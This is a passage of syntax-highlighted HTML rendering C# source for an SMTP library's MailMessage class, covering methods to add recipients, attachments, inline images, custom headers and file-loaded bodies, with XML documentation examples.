             </span><span class="sc11">set</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">value</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc10">}</span><span class="sc0">
         </span><span class="sc10">}</span><span class="sc0">

         </span><span class="sc15">/// &lt;summary&gt;Adds a recipient EmailAddress to the MailMessage&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="address"&gt;EmailAddress that you want to add to the MailMessage&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="type"&gt;AddressType of the address&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     EmailAddress cc = new EmailAddress("cc@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddRecipient(cc, AddressType.Cc);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddRecipient</span><span class="sc10">(</span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">AddressType</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">try</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">type</span><span class="sc10">)</span><span class="sc0">
                </span><span class="sc10">{</span><span class="sc0">
                    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">AddressType</span><span class="sc10">.</span><span class="sc11">To</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc11">recipientList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">AddressType</span><span class="sc10">.</span><span class="sc11">Cc</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc11">ccList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">AddressType</span><span class="sc10">.</span><span class="sc11">Bcc</span><span class="sc10">:</span><span class="sc0">
                        </span><span class="sc11">bccList</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">
                        </span><span class="sc5">break</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
            </span><span class="sc5">catch</span><span class="sc10">(</span><span class="sc11">Exception</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc5">throw</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">SmtpException</span><span class="sc10">(</span><span class="sc6">"Exception in AddRecipient: "</span><span class="sc0"> </span><span class="sc10">+</span><span class="sc0"> </span><span class="sc11">e</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Adds a recipient RFC 822 formatted email address to the MailMessage&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="address"&gt;RFC 822 formatted email address that you want to add to the MailMessage&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="type"&gt;AddressType of the email address&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddRecipient("cc@OpenSmtp.com", AddressType.Cc);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddRecipient</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">address</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">AddressType</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">EmailAddress</span><span class="sc0"> </span><span class="sc11">email</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">EmailAddress</span><span class="sc10">(</span><span class="sc11">address</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">AddRecipient</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">type</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc15">/// &lt;summary&gt;Adds an Attachment to the MailMessage using a file path&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="filepath"&gt;File path to the file you want to attach to the MailMessage&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddAttachment(@"C:\file.jpg");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc2">// start added/modified by mb
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddAttachment</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filepath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">AddAttachment</span><span class="sc10">(</span><span class="sc11">filepath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NewCid</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Adds an included image to the MailMessage using a file path&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="filepath"&gt;File path to the file you want to attach to the MailMessage&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddImage(@"C:\file.jpg");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc2">// start added/modified by mb
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddImage</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filepath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">AddImage</span><span class="sc10">(</span><span class="sc11">filepath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">NewCid</span><span class="sc10">());</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddImage</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filepath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">cid</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filepath</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc11">image</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">(</span><span class="sc11">filepath</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">image</span><span class="sc10">.</span><span class="sc11">contentid</span><span class="sc10">=</span><span class="sc11">cid</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">images</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">image</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">           
        </span><span class="sc10">}</span><span class="sc0">
    
    
        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Generate a content id
</span><span class="sc0">        </span><span class="sc15">/// &lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">private</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">NewCid</span><span class="sc10">()</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">attachmentid</span><span class="sc10">=</span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">+</span><span class="sc11">images</span><span class="sc10">.</span><span class="sc11">Count</span><span class="sc10">+</span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc6">"att"</span><span class="sc10">+</span><span class="sc11">attachmentid</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddAttachment</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filepath</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">cid</span><span class="sc10">)</span><span class="sc0"> 
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">filepath</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                </span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc11">attachment</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">Attachment</span><span class="sc10">(</span><span class="sc11">filepath</span><span class="sc10">);</span><span class="sc0">
                </span><span class="sc11">attachment</span><span class="sc10">.</span><span class="sc11">contentid</span><span class="sc10">=</span><span class="sc11">cid</span><span class="sc10">;</span><span class="sc0">
                </span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">attachment</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc10">}</span><span class="sc0">           
        </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc2">// end added by mb
</span><span class="sc0">
        </span><span class="sc15">/// &lt;summary&gt;Adds an Attachment to the MailMessage using an Attachment instance&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="attachment"&gt;Attachment you want to attach to the MailMessage&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     Attachment att = new Attachment(@"C:\file.jpg");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddAttachment(att);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddAttachment</span><span class="sc10">(</span><span class="sc11">Attachment</span><span class="sc0"> </span><span class="sc11">attachment</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">attachment</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">attachment</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Adds an Attachment to the MailMessage using a provided Stream&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="stream"&gt;stream you want to attach to the MailMessage&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     Attachment att = new Attachment(new FileStream(@"C:\File.jpg", FileMode.Open, FileAccess.Read), "Test Name");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddAttachment(att);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddAttachment</span><span class="sc10">(</span><span class="sc11">Stream</span><span class="sc0"> </span><span class="sc11">stream</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">stream</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">stream</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">


        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Adds an custom header to the MailMessage.
</span><span class="sc0">        </span><span class="sc15">/// NOTE: some SMTP servers will reject improper custom headers
</span><span class="sc0">        </span><span class="sc15">///&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="name"&gt;Name of the custom header&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="body"&gt;Value of the custom header&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.AddCustomHeader("X-Something", "HeaderValue");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddCustomHeader</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">AddCustomHeader</span><span class="sc10">(</span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">MailHeader</span><span class="sc10">(</span><span class="sc11">name</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">body</span><span class="sc10">));</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// Adds an custom header to the MailMessage.
</span><span class="sc0">        </span><span class="sc15">/// NOTE: some SMTP servers will reject improper custom headers
</span><span class="sc0">        </span><span class="sc15">///&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="mailheader"&gt;MailHeader instance&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     MailHeader header = new MailHeader("X-Something", "HeaderValue");       
</span><span class="sc0">        </span><span class="sc15">///     msg.AddCustomHeader(header);
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">AddCustomHeader</span><span class="sc10">(</span><span class="sc11">MailHeader</span><span class="sc0"> </span><span class="sc11">mailheader</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">mailheader</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">mailheader</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">)</span><span class="sc0">
            </span><span class="sc10">{</span><span class="sc0">
                 </span><span class="sc11">customHeaders</span><span class="sc10">.</span><span class="sc11">Add</span><span class="sc10">(</span><span class="sc11">mailheader</span><span class="sc10">);</span><span class="sc0">
             </span><span class="sc10">}</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Populates the Body property of the MailMessage from a text file&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="filePath"&gt;Path to the file containing the MailMessage body&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.GetBodyFromFile(@"C:\body.txt");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetBodyFromFile</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileAsString</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Populates the HtmlBody property of the MailMessage from a HTML file&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="filePath"&gt;Path to the file containing the MailMessage html body&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.GetHtmlBodyFromFile(@"C:\htmlbody.html");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">GetHtmlBodyFromFile</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc2">// add extension
</span><span class="sc0">            </span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">htmlBody</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">GetFileAsString</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Resets all of the MailMessage properties&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.Reset();
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Reset</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">from</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">replyTo</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">recipientList</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">ccList</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">bccList</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">customHeaders</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">attachments</span><span class="sc10">.</span><span class="sc11">Clear</span><span class="sc10">();</span><span class="sc0">
            </span><span class="sc11">subject</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">body</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">htmlBody</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">priority</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">mixedBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
             </span><span class="sc11">altBoundary</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
             </span><span class="sc11">charset</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc10">;</span><span class="sc0">
            </span><span class="sc11">notification</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">false</span><span class="sc10">;</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Saves the MailMessage as a RFC 822 formatted message&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;param name="filePath"&gt;Specifies the file path to save the message&lt;/param&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.Body = "body";
</span><span class="sc0">        </span><span class="sc15">///     msg.Subject = "subject";
</span><span class="sc0">        </span><span class="sc15">///     msg.Save(@"C:\email.txt");
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">Save</span><span class="sc10">(</span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">filePath</span><span class="sc10">)</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StreamWriter</span><span class="sc0"> </span><span class="sc11">sw</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">File</span><span class="sc10">.</span><span class="sc11">CreateText</span><span class="sc10">(</span><span class="sc11">filePath</span><span class="sc10">);</span><span class="sc0">
            </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">Write</span><span class="sc10">(</span><span class="sc5">this</span><span class="sc10">.</span><span class="sc11">ToString</span><span class="sc10">());</span><span class="sc0">
            </span><span class="sc11">sw</span><span class="sc10">.</span><span class="sc11">Close</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">

        </span><span class="sc15">/// &lt;summary&gt;Returns the MailMessage as a RFC 822 formatted message&lt;/summary&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;code&gt;
</span><span class="sc0">        </span><span class="sc15">///     MailMessage msg = new MailMessage("support@OpenSmtp.com", "recipient@OpenSmtp.com");
</span><span class="sc0">        </span><span class="sc15">///     msg.Body = "body";
</span><span class="sc0">        </span><span class="sc15">///     msg.Subject = "subject";
</span><span class="sc0">        </span><span class="sc15">///     string message = msg.ToString();
</span><span class="sc0">        </span><span class="sc15">/// &lt;/code&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;/example&gt;
</span><span class="sc0">        </span><span class="sc15">/// &lt;returns&gt;Mailmessage as RFC 822 formatted string&lt;/returns&gt;
</span><span class="sc0">        </span><span class="sc5">public</span><span class="sc0"> </span><span class="sc5">override</span><span class="sc0"> </span><span class="sc16">string</span><span class="sc0"> </span><span class="sc11">ToString</span><span class="sc10">()</span><span class="sc0">
        </span><span class="sc10">{</span><span class="sc0">
            </span><span class="sc11">StringBuilder</span><span class="sc0"> </span><span class="sc11">sb</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc5">new</span><span class="sc0"> </span><span class="sc11">StringBuilder</span><span class="sc10">();</span><span class="sc0">

            </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc5">null</span><span class="sc0"> </span><span class="sc10">&amp;&amp;</span><span class="sc0"> </span><span class="sc11">ReplyTo</span><span class="sc10">.</span><span class="sc11">name</span><span class="sc10">.</span><span class="sc11">Length</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0">
             </span><span class="sc10">{</span><span class="sc0">
